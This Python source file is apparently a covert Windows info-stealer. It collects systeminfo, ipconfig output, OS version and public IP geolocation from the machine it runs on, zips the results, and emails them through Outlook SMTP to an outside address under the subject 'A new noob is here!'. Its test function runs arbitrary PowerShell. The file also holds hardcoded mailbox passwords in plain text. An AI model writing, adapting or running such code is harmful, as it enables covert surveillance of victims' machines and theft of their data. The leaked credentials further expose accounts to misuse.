import os 
import smtplib

import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
import subprocess

import json

from zipfile import ZipFile
import datetime


def sendMail():
    pathFolder = "data/"

    proc = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE, shell=False)
    (outInfoPC, err) = proc.communicate()
    outInfoPC =  outInfoPC.decode('utf_8', 'ignore')
    outInfoPC.replace('‚', 'é').replace('“', 'ô').replace('ÿ', ' ').replace('…', 'à')
    
    f = open(f"{pathFolder}ipconfig.txt", "w")
    f.write(os.popen("ipconfig /all").read().replace('‚', 'é').replace('“', 'ô').replace('ÿ', ' ').replace('…', 'à'))
    f.close()
    f2 = open(f"{pathFolder}systeminfo.txt", "w")
    f2.write(outInfoPC)
    f2.close()

    # ipInfo = json.loads(os.popen('curl ipinfo.io').read())
    # ipInfo = json.dumps(os.popen('curl ipinfo.io').read(), indent=4)
    ipInfo = os.popen('curl ipinfo.io').read()
    OSName = os.popen('ver').read()

    f3 = open(f"{pathFolder}ipinfo.json", "w")
    f3.write(ipInfo)
    f3.close()

    OSName = OSName.split("version")

    OSNameDict = dict()
    OSNameDict['os'] = OSName
    OSNameDict['osname'] = OSName[0]
    OSNameDict['osversion'] = OSName[1].replace(']', '').replace(' ', '')

    OSNameDict = str(OSNameDict).replace("'", '"')

    f4 = open(f"{pathFolder}osname.json", "w")
    f4.write(OSNameDict)
    f4.close()


    subject = f"A new noob is here!"
    #json.dumps(ipInfo)
    # message = f'''IP : {ipInfo['ip']}
    # Hostname : {ipInfo['hostname']}
    # City : {ipInfo['city']}
    # Region : {ipInfo['region']}
    # Postal Code : {ipInfo['postal']}
    # Country code : {ipInfo['country']}
    # Coordinates : {ipInfo['loc']}
    # Organization : {ipInfo['org']}
    # Timezone : {ipInfo['timezone']}

    # OS : ${OSName}
    # '''
    message="Nice to meet you :)"


    FROM_EMAIL = 'envoyeurg12v2@outlook.com'
    TO_EMAIL = 'plasticeaterg12@outlook.com'
    #]>=8gY2^V~FtpKS
    PASSWORD = "SalutEnvoyeur-07-06.24"


    # smtp.gmail.com
    # smtp-mail.outlook.com',587
    try:
        mail = smtplib.SMTP('smtp-mail.outlook.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(FROM_EMAIL,PASSWORD)
    except:
        print("Couldn't setup email!!") 




    # msg=MIMEText(message)
    # msg['Subject']=subject
    # msg['To']=','.join(TO_EMAIL)
    # msg['From']=FROM_EMAIL
    # msg['Date'] = formatdate(localtime=True)
    msg = MIMEMultipart()
    msg['From'] = FROM_EMAIL
    msg['To'] = TO_EMAIL
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    # files = ["ipconfig.txt"]
    msg.attach(MIMEText(message, 'plain', 'utf-8'))

    print("weshhh")

    zipName = f"{str(datetime.datetime.today()).replace(' ', '_').replace(':', '-').split('.')[0]}_{json.loads(os.popen('curl ipinfo.io').read())['ip']}"
    print(zipName)


    with ZipFile(f'{pathFolder}{zipName}.zip', 'w') as myzip:
        myzip.write(f'{pathFolder}systeminfo.txt')
        myzip.write(f'{pathFolder}ipconfig.txt')
        myzip.write(f"{pathFolder}ipinfo.json")
        myzip.write(f"{pathFolder}osname.json")
        myzip.write(f'readme.txt')
        # myzip.write(f'{pathFolder}readme.txt')

    filename = f"{pathFolder}{zipName}.zip"
    with open(filename, 'rb') as fp:
        bytes = fp.read()
    # attachment = MIMEText(f.read())
    # attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
    # msg.attach(attachment)
    att = MIMEApplication(bytes, Name=filename)
    att['Content-Disposition'] = f'attachment; filename="{filename}"'
    msg.attach(att)


        
    mail.send_message(msg)

    mail.close()

def test(cmd):
    pathFolder = "data/"

    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    completed = str(completed.stdout).replace(repr('\r\n'), ',')

    f46 = open(f"{pathFolder}Get-ComputerInfo.json", "w")
    f46.write(completed)
    f46.close()

    proc = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE, shell=False)
    (outInfoPC, err) = proc.communicate()
    print(type(outInfoPC))
    # outInfoPC =  outInfoPC.decode('utf_8', 'ignore')
    outInfoPC =  str(outInfoPC)
    outInfoPC.replace('‚', 'é').replace(repr('\x93'), 'ô').replace('ÿ', ' ').replace('…', 'à')

    f47 = open(f"{pathFolder}ragot.txt", "w")
    f47.write(outInfoPC)
    f47.close()



    OSName = os.popen('ver').read().replace('\n', '')

    OSNameDict = dict()

    OSName = OSName.split("version")
    OSNameDict['os'] = OSName
    OSNameDict['osname'] = OSName[0]
    OSNameDict['osversion'] = OSName[1].replace(']', '').replace(' ', '')

    OSNameDict = str(OSNameDict).replace("'", '"')

    f4 = open(f"{pathFolder}osname.json", "w")
    f4.write(OSNameDict)
    f4.close()

    return completed